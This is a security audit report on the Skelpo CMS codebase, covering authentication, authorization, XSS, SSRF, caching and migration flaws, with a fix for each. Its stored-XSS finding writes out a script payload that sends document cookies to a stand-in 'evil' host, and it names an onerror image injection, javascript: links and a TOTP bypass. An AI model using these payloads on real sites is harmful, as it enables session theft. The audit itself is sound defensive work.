# Fable Audit — Skelpo CMS

**Date:** 2026-07-04
**Branch:** `fix/perry-runtime-compat` (with uncommitted working-tree changes)
**Head:** `45989c4` (`fix(auth): lower bcrypt cost 12 → 10 for the perry runtime`)
**Scope:** Full repository — `src/` (~16k LOC), `packages/` (`@skelpo/cms-client`, `@skelpo/site-kit`), `migrations/`, `tests/`, `.github/`, `scripts/`, `docs/`, config, and the current working diff.
**Method:** Manual reading of the auth/authz/injection core plus six parallel deep-dive passes (auth & sessions; injection/XSS/SSRF/upload; authorization; correctness/concurrency; CI/build/deps/release; tests/docs/hygiene). Every finding was verified against the code; load-bearing claims (Perry fail-open path, cursor/`MyDateTime` serialization, CI exit-code masking, capability escalation, gitignore gap) were reproduced or re-read firsthand. Typecheck and the DB-free unit suite were executed.

---

## Executive summary

Skelpo CMS is a well-architected, genuinely thoughtful codebase: the SQL layer is **uniformly parameterized** (no SQL injection found anywhere), media path handling is **safe by construction**, session/token/invite secrets use a CSPRNG, API tokens are stored hashed, there is **no default admin credential**, the permission core (`can()`) is carefully written, and the schema is well-indexed. It typechecks clean and its 57 unit tests pass.

However, the audit surfaced a set of serious issues concentrated in five areas:

1. **Output encoding / stored XSS.** Content bodies are rendered to HTML with no sanitization (`marked` and the TipTap renderer), reachable by low-privilege authors — a live stored-XSS on the public site.
2. **Authorization holes.** `manage*` capabilities collapse into full admin (no allowlist on role/capability/user-role assignment); several read paths and the content `status` write skip the intended capability, exposing drafts, submission PII, and settings — some of it **unauthenticated**.
3. **Caching correctness.** `invalidate()` is repeatedly called with cache keys instead of dependency keys (a silent no-op), the dependency graph leaks on eviction, and there is no TTL — so several surfaces serve **permanently stale** data.
4. **CI integrity.** The integration test step can neither fail (an `&&/||` shell-chain masks the exit code) nor even detect a missing DB — so a green pipeline can verify almost nothing.
5. **Data hygiene.** ~78 MB of a real, named customer's product photography (`uploads-verrano/`) sits untracked but **not** covered by `.gitignore` in what the README presents as an MIT public repo.

Counts: **3 Critical, ~22 High, ~18 Medium, ~15 Low/Info.**

### Fix these first (in order)

1. **Add `uploads-verrano/` (and `uploads*/`) to `.gitignore` now** — a `git add -A` permanently publishes customer photos. (§11.1)
2. **Sanitize rendered content HTML** in `@skelpo/site-kit` (`renderMarkdown`, `renderTipTap`) and block `javascript:` hrefs. (§3.1)
3. **Restrict capability/role/user-role assignment** — allowlist caps, forbid granting `*` or caps the actor lacks, block editing built-in roles, block self-role escalation. (§2.1)
4. **Fix the `test:integration` script** (exit code masking) and add a CI tripwire when the DB is unreachable. (§8.1)
5. **Bump `hono` to ≥4.12.25** (free, in-range CVE fix) and refresh the lockfile. (§8.2)
6. **Fix `invalidate()` dependency-key usage** and add a cache TTL. (§4.1–4.3)
7. **Gate the leaky read paths** — admin content/detail, `/admin/forms/:slug`, and `GET /api/v1/settings`. (§2.3–2.5)
8. **Disable the fake TOTP branch** (fail closed) until real verification ships. (§1.1)

---

## Severity legend

- **Critical** — severe and reachable in a realistic configuration; fix before further production use.
- **High** — serious; exploitable/triggerable under plausible conditions, or a correctness break that loses/leaks data.
- **Medium** — real risk requiring specific conditions or elevated privilege.
- **Low / Info** — hardening, hygiene, defense-in-depth, or documentation.

Reachability is stated per finding. "Live" = affects the Node/Bun runtime as deployed today. "Latent" = not currently reachable but will activate under a stated condition (a Perry serve path, a custom role, an enrolled feature).

---

## 1. Authentication & session security

**1.1 — HIGH (latent) — TOTP/2FA is non-functional and bypassable on both login paths.**
`src/routes/api/auth.ts:80-91` gates on `user.totpVerified === 1` and then only checks `/^\d{6}$/.test(totpCode)` — **any six digits pass** (`000000` works); the code is never compared to `users.totpSecret` (the TODO admits it). The admin login (`src/admin/routes.tsx:101-129`) checks **no** TOTP at all. No code path currently sets `totpVerified = 1` (no enrollment route/CLI), so it is latent — but the docs present 2FA as a working feature, so an operator flipping the flag by hand turns 2FA into pure theater. `toPublicUser` even reports `totpEnabled` from that flag, so the UI would claim protection that doesn't exist.
**Fix:** fail **closed** — block login with a hard error when `totpVerified = 1` until `src/auth/totp.ts` (HMAC-SHA1, ±1 step window, one-time step-reuse guard) exists; enforce it on the admin path too; add a test that a wrong code is rejected.

**1.2 — HIGH — Session cookie `Secure` flag is off behind a TLS-terminating proxy; no HSTS.**
`src/admin/routes.tsx:120` sets `secure: c.req.url.startsWith('https://')`. The inline `node:http` adapter always builds the URL as `http://…` (`src/server.ts`), and behind the documented nginx→pm2 deploy the app sees plaintext — so the admin `skelpoSession` cookie is issued **without `Secure`** and can leak over any http request. No `Strict-Transport-Security` header is set anywhere (`src/app.ts` adds only `X-Skelpo-Version`). The API login (`auth.ts:101`) is better (also honors `x-forwarded-proto`), but `/auth/refresh` (`auth.ts:172`) and the lang cookie (`routes.tsx:145`) share the weak check.
**Fix:** derive scheme from `x-forwarded-proto` / a `TRUST_PROXY`/`config.siteUrl` setting for `Secure` on all auth cookies; emit HSTS.

**1.3 — MEDIUM — `clientIp` trusts spoofable `X-Forwarded-For` with no trusted-proxy config.**
`src/routes/api/_helpers.ts:19-25` takes the first `x-forwarded-for` / `x-real-ip` verbatim, falling back to the literal `'0.0.0.0'`; the socket address is never used. Consequences: the per-IP login limit (10/15 min, `ratelimit.ts`) is bypassed by rotating the header (password spraying); with no proxy every client shares the `'0.0.0.0'` bucket; the per-email limit (5/15 min, keyed on attacker-supplied email) lets an unauthenticated party **lock out a known admin email on demand** and flood `loginAttempts`; and `sessions.ip` / `formSubmissions.ip` audit fields are attacker-controlled.
**Fix:** key rate-limiting on the real connection IP; only honor `X-Forwarded-For` from configured proxy hops.

**1.4 — MEDIUM — Login timing enables user enumeration.**
`auth.ts:65-77` and `routes.tsx:113`: an unknown email returns immediately (no bcrypt), a known email runs `bcrypt.compare` (~100-250 ms on Node, seconds on Perry). Response bodies match, but the timing gap distinguishes valid accounts.
**Fix:** run a dummy bcrypt compare against a constant hash on the unknown-user path.

**1.5 — MEDIUM — Session tokens stored in plaintext as the primary key.**
`src/auth/sessions.ts:30,45` inserts and looks up the 256-bit token verbatim — unlike API tokens, which store `sha256(token)` (`tokens.ts`). Any read-only DB exposure (backup leak, replica, SQLi elsewhere) yields **live, replayable** session tokens.
**Fix:** store `sha256(token)` as the PK and hash on lookup, matching the API-token design.

**1.6 — MEDIUM — Password change does not invalidate other sessions; "log out everywhere" is dead code.**
`src/routes/api/users.ts:114` updates `passwordHash` but never deletes sessions or revokes tokens; `deleteAllSessionsForUser` (`sessions.ts:55`) has **no caller** anywhere. After a suspected-compromise password reset, stolen cookies/tokens stay valid up to 30 days.
**Fix:** call `deleteAllSessionsForUser` (and revoke tokens) on password change, preserving the current session if desired.

**1.7 — MEDIUM — API token scopes are stored but never enforced.**
`lookupToken` returns `scopes` and `middleware.ts:43` puts them on `auth.token.scopes`, but `can()` consults only role capabilities — no code reads `auth.token.scopes` (confirmed by grep). A "read-only" token wields the full privileges of its owner's role.
**Fix:** intersect role capabilities with token scopes in the auth/permission path, or remove the scopes UI until enforced.

**1.8 — LOW — 30-day absolute session TTL, no idle timeout, no rotation; `/auth/refresh` never revokes the old session.**
`sessions.ts:6`, `auth.ts:165-176`. Sessions accumulate and a stolen cookie is usable for up to a month; refresh extends indefinitely without invalidating the prior token.
**Fix:** add an idle timeout, lower the admin absolute lifetime, and delete the prior session on refresh.

**1.9 — LOW — Weak password policy; bcrypt silently truncates at 72 bytes.**
`src/auth/password.ts:16-21`: minimum 8, no complexity/breach check; the 200-char max is moot because bcrypt truncates at 72 bytes with no pre-hash, so long-passphrase entropy is lost.
**Fix:** raise the admin minimum (≥12), add a breached-password check, and pre-hash (e.g. base64(sha256)) before bcrypt if long passphrases should count.

**1.10 — LOW — `SESSION_SECRET` is required at boot but never used.**
`src/config.ts:69` calls `required('SESSION_SECRET')`, but nothing in `src/` consumes it (cookies are unsigned bearer tokens; security rests on the random DB token, which is fine). The shipped placeholder passes the non-empty check, so operators may believe cookies are signed when they aren't.
**Fix:** remove the unused secret, or enforce a real length/entropy check and document that cookies are unsigned.

**1.11 — INFO — bcrypt cost 10 is acceptable but was lowered for all runtimes.**
`password.ts:13` — cost 10 meets the OWASP floor; the Perry-perf rationale is sound. Note the change weakens Node/Bun hashes too (where it wasn't needed). Track raising back to ≥12 once Perry's bcrypt nears native speed. Existing hashes keep their embedded cost.

**1.12 — INFO — CSRF rests solely on `SameSite=Lax`; logout is a state-changing GET.**
No CSRF tokens or Origin/Referer checks exist (grep-confirmed). `Lax` does block cross-site POST, so the POST admin mutations are reasonably covered — but `GET /admin/logout` (`routes.tsx:131`) is a top-level-navigable forced-logout CSRF, and there's no defense-in-depth.
**Fix:** make logout a POST; add a per-session CSRF token or explicit same-origin check to admin mutations.

---

## 2. Authorization & access control

**2.1 — CRITICAL — `manage*` capabilities collapse into full admin; no allowlist on capability/role/user-role assignment.**
`roleRoutes.patch('/:slug')` (`src/routes/api/users.ts:182-200`) writes `body.capabilities` verbatim with **no allowlist and no `isBuiltin` guard** (only DELETE checks `isBuiltin`). A holder of `manageRoles` can PATCH its **own** role to `{"global":["*"]}` (superadmin) or rewrite the built-in `admin`/`viewer` roles. Separately, a `manageUsers` holder can assign any `roleId`/`roleSlug` including `admin` on create (`users.ts:45-99`) or edit (`users.ts:101-124`), and can **reset any user's password** (`users.ts:114`) — i.e. mint or take over an admin account. `can()` grants everything for `global:['*']` (`check.ts:73,79`).
Default seed only gives `admin` these caps, so it is **not exploitable out of the box** — but the product's custom-role feature makes `manage*` effectively equivalent to `*` for any delegated role, which is a total escalation.
**Fix:** validate submitted capabilities against an allowlist; forbid granting `'*'` or any cap the actor lacks; block editing built-in roles and assigning a role ≥ the actor's privilege; forbid a user editing its own role's capabilities.

**2.2 — HIGH — Content `status` is mass-assignable → publish without the `publish` capability, bypassing validation.**
`PATCH /api/v1/content/:id` (`content.ts:291-292`) forwards the raw body into `updateContent`, which applies `patch.status` / `publishedAt` / `scheduledAt` (`writer.ts:237-239`); `POST /content` similarly honors `body.status`. Both gate only on `update`/`create`, never `publish`. A **contributor** (seeded `post:['read','create','updateOwn']`, no publish) can `PATCH {"status":"published"}` on its own post and push it live — skipping `validateFields`/`validateSeoForPublish` and leaving `publishedAt = NULL` (so it's excluded by date filters and mis-sorted). The admin writer (`routes.tsx:733-735`) whitelists fields and checks publish separately, so the API is strictly weaker.
**Fix:** strip `status`/`publishedAt`/`scheduledAt` from the create/update field set; require an explicit `publish` check for any transition into `published`, running publish validation + `publishedAt` logic.

**2.3 — HIGH — Admin content list & detail enforce only authentication, not `read`/`readDrafts`.**
`GET /admin/content/:type` (`routes.tsx:441-471`) lists all statuses with `includeDrafts:true`, and `GET /admin/content/:type/:id` (`:611-618`) loads with drafts, both behind only `gate(c)`. Any authenticated user — a **viewer** (no `readDrafts`) or an **author** (no cap at all on the `doc` type) — can read every type's drafts and other users' unpublished rows. The API by-id path checks `readDrafts`; the admin path does not.
**Fix:** check `read` and, for non-published rows, `readDrafts`/`readOthersDrafts` in both admin handlers.

**2.4 — HIGH — Form-submission detail page has no capability check (PII exposure).**
`GET /admin/forms/:slug` (`screens.tsx:762-855`) renders all submissions — names, emails, IPs — behind only `gate(c)`. The index page `/admin/forms` correctly gates on `viewSubmissions || manageForms`; the detail page does not. Any authenticated user (viewer/author/contributor) can enumerate `/admin/forms/<slug>` and read submitted PII.
**Fix:** add the same `viewSubmissions || manageForms` gate the index uses.

**2.5 — HIGH — `GET /api/v1/settings` and `/settings/:key` are unauthenticated (world-readable).**
`src/routes/api/settings.ts:15-33` has no `requireAuth`/`can` gate; `getAllSettings()` returns every key. Anonymous clients can dump all settings — including `site.previewToken` (the maintenance-mode bypass, set at `routes.tsx:381`) and any secret an operator stored in the flat KV (SMTP creds, API keys, analytics tokens). Strictly weaker than the admin equivalent, which sits behind login.
**Fix:** require auth, or maintain an explicit public-settings allowlist and expose only those keys.

**2.6 — MEDIUM — `readOthersDrafts` is never enforced; `readDrafts` reads everyone's drafts.**
`can()` resolves `readDrafts` via the generic `includes(action)` (`check.ts:95`) and ignores `ownerId`; the `readOthersDrafts` action is defined and seeded on admin but referenced by **no** route and no branch of `can()`. The API draft reads pass `row.authorId` but discard it. An **author** (has `readDrafts`, not `readOthersDrafts`) can read every other author's unpublished drafts via `GET /content?status=draft` and the by-id/slug/path endpoints.
**Fix:** when `row.authorId !== userId`, require `readOthersDrafts`; make `can()` consult `ownerId` for these actions; scope the list query to the caller unless they hold `readOthersDrafts`.

**2.7 — MEDIUM — Unauthenticated media item/raw/URL + IDOR enumeration.**
`GET /media/:id`, `/media/:id/raw`, `/media/:id/url` (`media.ts:53-102`) perform no auth check (only the list at `:40` requires auth). IDs are sequential; there is no per-asset ACL. Anyone can enumerate `/api/v1/media/<n>/raw` and download every uploaded asset, including images attached to unpublished content.
**Fix:** if media is private, require auth on item/raw/url; if public-CDN, use unguessable keys and document the public contract. At minimum make gating consistent.

**2.8 — LOW — `viewSubmissions` is dead on the API; seeded `editor` cannot moderate.**
The submissions API (`forms.ts:129,150,162`) gates on `manageForms`, never `viewSubmissions`; the admin moderation POST (`screens.tsx:860`) does the same. The seeded `editor` carries `viewSubmissions` (not `manageForms`) and CLAUDE.md says editors moderate submissions — so the mark-spam/delete actions silently no-op for the exact role designed to use them.
**Fix:** accept `viewSubmissions` for read + moderation; reserve `manageForms` for definition CRUD.

**2.9 — INFO — Per-type caps shadow the `'*'` type entry instead of merging.**
`check.ts:81`: `types[typeSlug] ?? types['*']` — a specific entry fully replaces the wildcard (no union). Intentional for the `editor.form` restriction, but a footgun: `{'*':['read'], post:['create']}` silently loses `read` on `post`. Over-denies (safe), not over-allows.

**2.10 — INFO — Content-type schemas are served publicly.**
`GET /types` and `/types/:slug` (`types.ts:19-28`) are unauthenticated, revealing every type's full field schema. Acceptable if intended for the frontend; noted for completeness.

**Positive:** the ownership core is correct — `can()` checks the base action before the `*Own` short-circuit (`check.ts:86-92`), so holding `updateOwn` does not grant edit on arbitrary rows, and the content write routes pass `row.authorId`. The wildcard `*` handling is sound.

---

## 3. Injection, output encoding & SSRF

**3.1 — CRITICAL — Content bodies rendered to HTML with no sanitization (stored XSS on the public site).**
`@skelpo/site-kit`'s `renderMarkdown()` (`packages/site-kit/src/markdown.ts`) calls `marked.parse()` with no sanitizer (site-kit's only dependency is `marked`, which passes raw inline HTML through). Content bodies are writable by non-admin roles (**editor** has create/update/publish on all non-form types; **author**/**contributor** author posts). An author publishing a body containing `<script>fetch('//evil/'+document.cookie)</script>` yields stored XSS for every public visitor of the consuming site. The TipTap renderer compounds it: `renderTipTap` (`packages/site-kit/src/richtext.ts:38-41`) emits `<a href="${attrEsc(href)}">` where `attrEsc` only escapes `&`/`"` and does **not** validate the scheme — a `javascript:` link href renders a clickable XSS.
**Fix:** sanitize the rendered HTML server-side (DOMPurify/`sanitize-html`) with a strict allowlist, or disable raw-HTML passthrough in `marked`; allowlist URL schemes (`http`/`https`/`mailto`/relative) and drop `javascript:`/`data:`/`vbscript:`.

**3.2 — HIGH — Media upload trusts client `Content-Type`, served inline same-origin (stored XSS / arbitrary hosting).**
Upload (`media.ts:106-148`) stores `file.type` verbatim with no MIME allowlist and no magic-byte check; `isImage` uses `startsWith('image/')`, accepting `image/svg+xml`. `GET /api/v1/media/:id/raw` (`:61-76`) is **unauthenticated**, streams with `Content-Type: m.mimeType` (client-chosen), no `Content-Disposition`, `Cache-Control: immutable`. With the default `MEDIA_BACKEND=local` (`publicUrl()===null`) it is served **same-origin as the admin**, so an SVG/HTML upload executes JS on the CMS origin and hosts arbitrary active content on the trusted domain. (Needs `manageMedia` — admin by default, but grantable to custom roles, and the unauthenticated hosting is dangerous regardless.)
**Fix:** enforce a server-side MIME/extension allowlist validated against sniffed magic bytes; never echo the client MIME for risky types; send `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` on `/raw`; store/serve SVG as `text/plain` or sanitize.

**3.3 — HIGH — Webhook delivery is an SSRF with response exfiltration and no timeout.**
`deliverWebhookJob` (`src/webhooks/dispatch.ts:111`) does `fetch(hook.url)` where `hook.url` is stored unvalidated by `createWebhook`/`updateWebhook` — no scheme check, no block for `127.0.0.1` / `169.254.169.254` / RFC-1918 / `.internal`. A `manageSettings` holder can point a webhook at cloud metadata or internal services (fired by creating content that emits a subscribed event), and the **response status + body (first 2000 chars) is persisted** (`dispatch.ts:120-136`) and readable via `GET /api/v1/webhooks/:id/deliveries` — turning blind SSRF into full read. There is also **no `fetch` timeout**, so a slow endpoint ties up a job worker indefinitely.
**Fix:** validate the URL is `https?://` resolving to a public IP (re-check on redirect) or restrict to an operator allowlist; add `AbortSignal.timeout(...)`.

**3.4 — MEDIUM — Unescaped user data in notification-email HTML (HTML/email injection).**
`forms.ts:87` builds `submissionHtml` as `<p><b>${k}:</b> ${String(v)}</p>` from raw **public** submitter values, and `interpolate()` (`src/email/adapter.ts:86-88`) does no escaping. A public form submitter injects arbitrary HTML (phishing, tracking pixels) into the admin notification email. The same unescaped `interpolate` also injects `displayName` into invite/reset templates.
**Fix:** HTML-escape each key/value when composing HTML fragments; escape interpolation values by default.

**3.5 — MEDIUM — No upload size cap / no global body limit (memory-exhaustion DoS).**
Uploads do `new Uint8Array(await file.arrayBuffer())` (`media.ts:139`, also `screens.tsx:590`) with no size check; `app.ts` mounts no `bodyLimit`; and the `node:http` adapter buffers the entire request body into memory before dispatch (`server.ts`). A large body is fully buffered.
**Fix:** add a `bodyLimit`/size guard and reject oversized files before buffering.

**3.6 — LOW — Client-side `innerHTML` from content-type repeater sub-field labels (DOM XSS across privilege boundary).**
`skelpoRepeaterAdd` (`contentEditor.tsx:182,190,192`) sets `card.innerHTML` from `sf.label||sf.name`; `validateFieldsSchema` (`typeWriter.ts:206-225`) validates only top-level `f.name` and never recurses into repeater sub-fields or labels. A `manageTypes` (developer) user can set a sub-field label to `<img src=x onerror=…>` that runs in an editor's session on "+ Add".
**Fix:** build rows with `createElement`/`textContent`; validate/escape sub-field names and labels.

**3.7 — LOW — Redirect `destination` stored/served unvalidated.**
`redirects.ts:53-56 / 100-109` accepts any string; a `manageRedirects` user can store `javascript:` or off-site destinations that become open-redirect/XSS on the consuming frontend.
**Fix:** validate `destination` scheme (relative or `https?:`) at write time.

**3.8 — LOW — `safeAdminReturn` is same-origin-only but unnormalized.**
`routes.tsx:154-156` correctly blocks `//host` cross-origin redirects but passes any raw `/admin*` value to `c.redirect()` without normalization or CR/LF stripping.
**Fix:** match a known-route allowlist; strip control characters.

**3.9 — LOW — `cli/backup.ts` restore uses backup-derived identifiers and media keys.**
`backup.ts:118,136,147,157-159` builds `INSERT INTO \`${t}\` (\`${c}\`…)` from backup column names and writes media to `join(localPath, key)` from backup keys (a `../` key escapes the uploads dir). Table names come from a fixed list and this is a local operator op, so risk is low — but restoring an untrusted backup allows arbitrary-path writes / identifier injection.
**Fix:** validate keys stay within the media root; restrict column names to a known set.

**3.10 — INFO — i18n bag injected into `<script>` via `JSON.stringify`.**
`screens.tsx:461`, `contentEditor.tsx:520`: `window.SKELPO_I18N=${JSON.stringify(bag)}` doesn't escape `<`; a translation containing `</script>` would break out. Source is developer-authored bundles today.
**Fix (defensive):** escape `<`,`>`,`&`,`U+2028/9` or use a safe serializer.

**Positives (verified firsthand and via full sweep):**
- **No SQL injection.** Every `query()`/`execute()` passes user values as bound `?` params; dynamic `SET`/`WHERE` fragments use hardcoded column literals; `IN (…)` uses placeholder arrays; `ORDER BY` sort is allowlisted (`content.ts:297-303`); `LIMIT/OFFSET` are `Number()`-coerced and clamped; backup table names come from a constant.
- **Media path traversal is not exploitable.** `storageKey` is server-generated `${yyyymm}/${randomHex}-${sanitize(filename)}`; `sanitize()` strips `/` and non-`[A-Za-z0-9._-]`; the key is a single path segment and is never user-settable on read or update.
- Admin JSX auto-escapes text/attribute values; the `dangerouslySetInnerHTML` blocks are static CSS/JS (aside from the i18n note).
- imgproxy source URL is fixed to the site's own `/raw` and HMAC-signed — not an SSRF vector (only the unvalidated `format` param is a minor nit).

---

## 4. Correctness — caching & invalidation

**4.1 — HIGH — `invalidate()` is called with cache keys, not dependency keys → permanent staleness.**
`invalidate()` (`src/cache/deps.ts:81`) only consults the depKey→cacheKey reverse index. `GET /menus` (`menus.ts:27`) registers **no** deps; `POST /menus` invalidates `['GET:/menus']` — a cache key that was never a dep key, so 0 entries are removed. With no TTL the cached list is stale forever. Same pattern in `settings.ts:51,71` (new setting keys never appear in the cached `GET:/settings`) and the menu-create/404-caching flow.
**Fix:** register umbrella dep keys in the list functions (`deps.add('menus')`, `deps.add('settings')`) and invalidate those; or add and use an intentional `cacheDeletePrefix(cacheKey)`.

**4.2 — HIGH — Dependency graph leaks on LRU eviction → unbounded memory growth.**
`LruMap.set` (`cache/lru.ts:29-37`) evicts the oldest entry with no callback; `cacheSet`/`cacheDelete` clean dep sets only for keys they explicitly touch (`deps.ts:41-64`). Every evicted entry leaves its cacheKey in each dep Set forever, and empty dep entries are never removed. Cache keys include full query strings (every `cursor=` value), so a busy site churns keys and leaks one string + N set memberships per eviction → creeping RSS/OOM; `invalidate()` counts get inflated by dead keys.
**Fix:** give `LruMap` an `onEvict` hook that runs the `cacheDelete` dep-cleanup; delete dep entries when their set empties.

**4.3 — HIGH — Read/compute vs invalidate race caches stale data forever; TTL never enforced.**
`cache/respond.ts:37-58`: on a miss, `fn(deps)` reads the DB, then several awaits (content inflation, `computeEtag`) run before `cacheSet`. A write landing in that window runs `invalidate()` while the cache is empty → the entry then stored holds pre-write data. `storedAt` is written but **never checked** (no TTL), so it serves until the next write to the same dep. Trigger: a by-slug GET (miss) racing a PATCH of the same row → readers see the old title indefinitely.
**Fix:** snapshot an invalidation generation/epoch before `fn` and skip `cacheSet` if any of the entry's deps were invalidated since; add a real TTL check on `storedAt`.

**4.4 — MEDIUM — Schema/urlPattern/default-locale changes never invalidate the response cache.**
`updateType`/`deleteType` (`typeWriter.ts:171-172`, `types.ts:85`) call only `invalidateTypeRegistry()`/`clearRevisionCache()`; neither calls `invalidate()`. The dep key `schema:<typeSlug>` documented in `deps.ts:19` is emitted nowhere, and cached content embeds `url` computed from `urlPattern` + `site.defaultLocale` (`content.ts:63-73`) without registering `setting:site.defaultLocale`. Changing a urlPattern or the default locale leaves every cached content/list response with the old `url` (and pre-migration field names) forever.
**Fix:** emit `schema:<typeSlug>` and `setting:site.defaultLocale` as deps on cached content responses; invalidate them (prefix) from `updateType`/`deleteType` and the settings writer.

**4.5 — LOW — Per-route `cacheControl` override is lost on cache hit.**
`respond.ts:39-41`: the hit path calls `respondFromEntry` without the override, and `CacheEntry` doesn't store it — so only the miss response carries a custom `Cache-Control`; all later hits revert to the default `s-maxage=300`.
**Fix:** persist `cacheControl` in the entry.

**4.6 — LOW — `If-None-Match` ignores weak validators (never 304 behind gzip proxies).**
`cache/etag.ts:17-23`: `tags.includes(etag)` never matches `W/"abc"` against a stored `"abc"`. RFC 9110 mandates weak comparison for `If-None-Match`, and nginx gzip hands clients weak forms.
**Fix:** strip a leading `W/` before comparing.

**4.7 — LOW — In-flight registry load can clobber a newer invalidation.**
`content/types.ts:62-70` (and `settings/store.ts:18-22`): `loadTypeRegistry` has no epoch guard, so a slow SELECT that started before an `updateType`+invalidate can assign its stale result after the cache was cleared → old schema served until the next edit.
**Fix:** capture a generation counter before the query; discard the result if invalidated meanwhile.

---

## 5. Correctness — jobs, scheduling & datetime

**5.1 — HIGH — Cursor pagination never advances (infinite loop).**
`content.ts:268-293` builds `nextCursor` from `JSON.stringify({ publishedAt: last.publishedAt, id })`. `@perryts/mysql` returns TIMESTAMP columns as `MyDateTime` objects with **no `toJSON`** (verified: `node_modules/@perryts/mysql/dist/types/datetime.d.ts` — only `Decimal` has `toJSON`), so the cursor encodes an object. On decode, the guard `typeof decoded.publishedAt === 'string'` (`:269`) fails → the cursor clause is silently skipped → page 2 returns page 1 with a fresh non-null cursor and `hasMore:true` forever. The keyset clause is also hard-coded to `publishedAt DESC` and ignores `sort` (duplicated/skipped rows for any other sort), and `publishedAt = NULL` draft rows also fail the string check.
**Fix:** encode `dateToIso(last.publishedAt)`+id; make the keyset clause match the active sort column/direction (or restrict cursoring to the default sort); fall back to id-only keyset when `publishedAt` is NULL.

**5.2 — HIGH — Scheduled publishing has no producer — it silently never happens.**
`scheduledPublish` appears only in the `JobKind` union and the handler; nothing enqueues it and nothing scans `content.scheduledAt` (the `idx_content_scheduled` index is unused). An editor sets `scheduledAt` (stored, returned by the API) → the date passes → the post never publishes. A manually enqueued job would also skip cache `invalidate()` and `fireEvent('content.published')`.
**Fix:** a periodic tick that claims `status='draft' AND scheduledAt <= NOW()`, publishes, invalidates, and fires the event.

**5.3 — HIGH — Job lease recovery can resurrect a still-running job → concurrent double execution.**
`recoverStuckJobs` (`queue.ts:135-142`) flips any `running` row with `lockedAt < NOW()-10min` back to `pending` without checking liveness; handlers have no time bound (`worker.ts:59-72`). A `sendEmail`/webhook handler that blocks 11 min gets re-claimed and runs twice (duplicate email/webhook); the first run's `markDone` then stomps the second's state. (The claim itself is correct — `SELECT … FOR UPDATE SKIP LOCKED` inside a transaction is atomic.)
**Fix:** bound handler runtime below the lease (`Promise.race` timeout); make recovery conditional on a heartbeat/attempts guard; retry failed `markDone`.

**5.4 — HIGH — Mixed UTC-JS-string vs SQL `NOW()` timezone conventions.**
No session `time_zone` is set (pool config, `.env.example`). `dateToIso` (`datetime.ts:24-35`) appends `Z` to session-local TIMESTAMP text; `enqueue` stores `runAt` as a UTC wall-time string but the claim compares `runAt <= NOW()` (session tz); `createContent` writes `publishedAt` via JS `toISOString()` (UTC) while `publishContent` uses `NOW()`. On a non-UTC MySQL server, queued jobs run hours early/late, `publishedAt` values disagree by the offset, and every API timestamp is a local time mislabeled `Z`. It coincidentally works on a UTC server — which is why local/CI pass. (This also affects session expiry in `sessions.ts`.)
**Fix:** set session `time_zone = '+00:00'` at pool init, or use `UTC_TIMESTAMP()` everywhere and never mix JS datetime strings with `NOW()`.

**5.5 — MEDIUM — Recurring maintenance jobs run once per boot; several kinds have no producer.**
`startWorker` (`worker.ts:100-103`) seeds `pruneSessions`/`pruneLoginAttempts` once; the handlers don't re-enqueue and there's no scheduler → they run once per process lifetime, so `sessions`/`loginAttempts` grow unbounded on a long-lived process. `pruneContentRevisions` is never enqueued (autosave revisions accumulate), and completed `jobs` rows are never pruned.
**Fix:** re-enqueue from the handler (or a scheduler tick); enqueue the revisions prune.

**5.6 — MEDIUM — Fire-and-forget promises without `.catch` → unhandled rejection can kill the process.**
`void recoverStuckJobs()` (`worker.ts:97`), boot `void enqueue(...)` (`:101-102`), and every `void fireEvent(...)` (`content.ts:270,305,327,348,368`; `routes.tsx:657`) have no rejection handler and hit the DB. A transient MySQL error → `unhandledRejection` → Node 22 default terminates the process mid-request. (`void tick()` is safe — it has its own try/catch.)
**Fix:** append `.catch(err => console.error(...))` at each site; consider a process-level `unhandledRejection` handler.

**5.7 — LOW — Non-Error throw breaks `markFailed`, stranding the job.**
`worker.ts:70` reads `(err as Error).message` (undefined for a thrown string), and `markFailed` (`queue.ts:97`) then calls `error.slice(...)` → TypeError inside the catch → the job stays `running` until 10-min recovery, real error lost.
**Fix:** `String((err as Error)?.message ?? err)`.

---

## 6. Correctness — content, schema evolution & migrations

**6.1 — HIGH — Field rename via schema diff = remove + add → values vanish from every row.**
`diffSchema` (`typeWriter.ts` / `schemaEvolution.ts:70-77`) never populates `renamed` (it can't detect renames), and PATCH `/types/:slug` computes the diff whenever `changes` is omitted (`typeWriter.ts:142`). A rename becomes `removed:[old]+added:[new]`; lazy migration moves each row's value into `fields._legacy.<old>` and the new field reads default/null. Trigger: rename `subtitle`→`tagline` on `post` → all posts show an empty `tagline`, recoverable only by hand from `_legacy`. Diff-generated `retyped` entries also carry no `transform`, so a text→number retype leaves `"abc"` in a number field (and `NaN < min` is false, so it can publish).
**Fix:** require explicit `changes` when the diff has simultaneous adds+removes (or add rename hints in the admin flow); default retypes to a sensible transform and validate `Number.isFinite`.

**6.2 — MEDIUM — `publishContent` validates unmigrated fields; `schemaRevision` never advances.**
`writer.ts:273-279` parses `existing.fields` raw (no `migrateFields`) and validates against the **current** schema → a draft written at rev N fails a bogus "required" error after a rename at rev N+1 even though a read would show it migrated. Root cause: `updateContent` (`writer.ts:230-242`) never sets `schemaRevision = currentRevision`, so rows lag forever and migrations re-run on every read (contradicting the `schemaEvolution.ts:4` "row rewritten on next save" design note).
**Fix:** migrate fields before validating in `publishContent`; persist migrated fields + bump `schemaRevision` in `updateContent`.

**6.3 — MEDIUM — Concurrent updates lose revision snapshots and return the other writer's data.**
`writer.ts:242-247,316`: `revision = revision + 1` is atomic, but the follow-up unkeyed `SELECT *` can observe the other updater's later state — A and B both bump (r+1, r+2), both re-SELECT r+2, both `saveRevision(id, r+2)`; the `(contentId, revision)` unique key + `INSERT IGNORE` drops one snapshot and **no snapshot exists for r+1**; A's HTTP response contains B's changes. No optimistic locking.
**Fix:** return the row via `WHERE id=? AND revision=<computed>`; replace `INSERT IGNORE` with a real insert that surfaces conflicts; accept `If-Match`/expectedRevision.

**6.4 — MEDIUM — Migration statement splitter corrupts string literals; no migration lock.**
`migrate.ts:75-85,117-124`: `line.replace(/--.*$/, '')` strips `--` **inside** quoted literals and the `;\s*\n` split fires on semicolons inside literals. A seed like `INSERT INTO settings VALUES ('sep','a--b');` is truncated → syntax error mid-file; DDL autocommits and the version row is only written at the end, leaving a half-migrated DB that re-applies earlier statements on retry. Also, two instances booting concurrently both migrate (no `GET_LOCK`) → duplicate `schemaMigrations` PK crash.
**Fix:** a quote-aware splitter (or one-statement-per-file); an advisory lock around `runMigrations`.

**6.5 — LOW — `translationGroupId` two-step write is non-atomic; slug-dup race returns 500 not 409.**
